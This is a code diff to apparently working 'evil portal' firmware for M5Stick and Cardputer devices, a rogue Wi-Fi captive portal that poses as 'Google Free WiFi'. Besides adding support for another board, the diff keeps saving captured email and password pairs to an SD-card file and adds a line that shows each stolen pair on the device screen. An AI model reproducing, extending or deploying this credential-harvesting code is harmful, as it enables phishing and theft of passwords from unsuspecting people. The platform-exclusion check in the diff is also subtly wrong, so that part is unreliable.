@@ -4,11 +4,20 @@
 #include <DNSServer.h>
 #include <WebServer.h>
 
-// #define M5STICKCPLUS
-#define M5CARDPUTER
+//#define M5STICKCPLUS
+#define M5STICKCPLUS2
+//#define M5CARDPUTER
 
-#if defined(M5STICKCPLUS) && defined(M5CARDPUTER)
-#error "Please define only one platform: M5STICKCPLUS or M5CARDPUTER"
+#if defined(M5STICKCPLUS) && defined(M5STICKCPLUS2) && defined(M5CARDPUTER)
+#error "Please define only one platform: M5STICKCPLUS, M5STICKCPLUS2 or M5CARDPUTER"
+#endif
+
+#if defined(M5STICKCPLUS)
+#include <M5StickCPlus.h>
+#elif defined(M5STICKCPLUS2)
+#include <M5StickCPlus2.h>
+#elif defined(M5CARDPUTER)
+#include <M5Cardputer.h>
 #endif
 
 #if defined(M5STICKCPLUS)
@@ -16,6 +25,18 @@
 #define SPEAKER M5.Beep
 #define HAS_LED 10  // Number is equivalent to GPIO
 #define GPIO_LED 10
+// #define HAS_SDCARD
+#define SD_CLK_PIN 0
+#define SD_MISO_PIN 36  //25
+#define SD_MOSI_PIN 26
+// #define SD_CS_PIN
+#endif
+
+#if defined(M5STICKCPLUS2)
+#define DISPLAY M5.Lcd
+#define SPEAKER M5.Speaker
+#define HAS_LED 19  // Number is equivalent to GPIO
+#define GPIO_LED 19
 // #define HAS_SDCARD
 #define SD_CLK_PIN 0
 #define SD_MISO_PIN 36  //25
@@ -40,13 +61,7 @@
 #include <SPI.h>
 #endif
 
-#if defined(M5STICKCPLUS)
-#include <M5StickCPlus.h>
-#elif defined(M5CARDPUTER)
-#include <M5Cardputer.h>
-#endif
-
-#define DEFAULT_AP_SSID_NAME "Google WiFi"
+#define DEFAULT_AP_SSID_NAME "Google Free WiFi"
 #define SD_CREDS_PATH "/evil-portal-creds.txt"
 // #define LANGUAGE_EN_US
 #define LANGUAGE_PT_BR
@@ -107,7 +122,7 @@ void setupDeviceSettings() {
   while (!Serial && millis() < 1000)
     ;
 
-#if defined(M5STICKCPLUS)
+#if defined(M5STICKCPLUS) || defined(M5STICKCPLUS2)
   M5.begin();
   DISPLAY.setRotation(3);
 #elif defined(M5CARDPUTER)
@@ -141,6 +156,8 @@ bool setupSdCard() {
     sdcardMounted = true;
     return true;
   }
+#else
+  return true;
 #endif
 }
 
@@ -160,7 +177,7 @@ void setupWebServer() {
 
 #if defined(M5STICKCPLUS)
     SPEAKER.tone(4000);
-#elif defined(M5CARDPUTER)
+#elif defined(M5CARDPUTER) || defined(M5STICKCPLUS2)
       SPEAKER.tone(4000, 50);
 #endif
 
@@ -199,7 +216,6 @@ void loop() {
   if ((millis() - lastTick) > TICK_TIMER) {
 
     lastTick = millis();
-
     if (totalCapturedCredentials != previousTotalCapturedCredentials) {
       previousTotalCapturedCredentials = totalCapturedCredentials;
 
@@ -289,6 +305,8 @@ String index_POST() {
 #if defined(HAS_SDCARD)
   appendToFile(SD, SD_CREDS_PATH, String(email + " = " + password).c_str());
 #endif
+
+    DISPLAY.print(email + ":" + password);
 
     return getHtmlContents(LOGIN_AFTER_MESSAGE);
 }
